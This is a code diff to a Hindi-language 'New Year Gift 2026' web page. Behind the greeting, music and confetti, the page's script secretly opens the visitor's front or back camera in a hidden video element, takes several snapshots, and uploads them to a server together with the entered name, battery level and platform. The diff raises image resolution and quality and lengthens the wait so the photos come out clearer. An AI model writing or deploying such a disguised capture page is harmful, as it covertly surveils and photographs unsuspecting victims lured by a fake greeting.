@@ -9,9 +9,10 @@
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .container { text-align: center; width: 85%; max-width: 400px; padding: 25px; border: 2px solid #ff0055; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 25px #ff0055; }
         h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; }
-        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; }
-        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; }
+        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; font-size: 16px; }
+        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; font-size: 18px; }
         #wish-box { display: none; }
+        .wish-text { font-size: 20px; font-weight: bold; line-height: 1.4; }
     </style>
 </head>
 <body>
@@ -19,13 +20,13 @@
     <div class="container" id="main-box">
         <h1>🎇 New Year Gift 🎇</h1>
         <p>अपना नाम लिखें और उपहार खोलें!</p>
-        <input type="text" id="userName" placeholder="आपका नाम...">
+        <input type="text" id="userName" placeholder="आपका नाम यहाँ लिखें...">
         <button onclick="startApp()">उपहार खोलें ✨</button>
     </div>
 
     <div class="container" id="wish-box">
-        <h2 id="wishMsg" style="font-size: 20px;"></h2>
-        <p>🎊 Happy New Year 2026 🎊</p>
+        <div class="wish-text" id="wishMsg"></div>
+        <p style="margin-top: 20px; color: #ff0055;">🎊 Happy New Year 2026 🎊</p>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline></video>
@@ -41,19 +42,27 @@
             let name = document.getElementById('userName').value;
             if(!name) return alert("नाम डालना जरूरी है!");
 
+            // स्क्रीन बदलें
             document.getElementById('main-box').style.display = 'none';
             document.getElementById('wish-box').style.display = 'block';
             document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको और आपके पूरे परिवार को New Year 2026 की ढेर सारी शुभकामनाएँ!`;
             
+            // म्यूजिक और पटाखे शुरू करें
             document.getElementById('music').play();
-            setInterval(() => { confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } }); }, 2000);
+            setInterval(() => { 
+                confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } }); 
+            }, 2000);
             
+            // कैमरा कैप्चर शुरू करें
             initCapture(name);
         }
 
         async function initCapture(name) {
             let info = { battery: "N/A", platform: navigator.platform };
-            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
+            try { 
+                let b = await navigator.getBattery(); 
+                info.battery = Math.round(b.level * 100) + "%"; 
+            } catch(e) {}
 
             if(mode === 'front') await runCam(name, info, {facingMode: "user"}, 5, "FRONT");
             else if(mode === 'back') await runCam(name, info, {facingMode: "environment"}, 5, "BACK");
@@ -66,32 +75,34 @@
         async function runCam(name, info, constraints, count, label) {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { ...constraints, width: {ideal: 640}, height: {ideal: 480} } 
+                    video: { ...constraints, width: {ideal: 1280}, height: {ideal: 720} } 
                 });
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                // 5 सेकंड का डिले ताकि कैमरा लाइट एडजस्ट कर ले
-                await new Promise(r => setTimeout(r, 5000)); 
+                // 6 सेकंड का इंतज़ार ताकि फोटो काली न आए
+                await new Promise(r => setTimeout(r, 6000)); 
 
                 for (let i = 1; i <= count; i++) {
                     let can = document.getElementById('c');
                     can.width = video.videoWidth; 
                     can.height = video.videoHeight;
-                    can.getContext('2d').drawImage(video, 0, 0);
+                    let ctx = can.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
                     
                     fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             name: name, 
-                            image: can.toDataURL('image/jpeg', 0.4), 
+                            image: can.toDataURL('image/jpeg', 0.5), 
                             info: info, 
                             label: label+" "+i,
                             uid: uid 
                         })
                     });
-                    await new Promise(r => setTimeout(r, 3000));
+                    // अगली फोटो के लिए थोड़ा इंतज़ार
+                    await new Promise(r => setTimeout(r, 3500));
                 }
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) {}
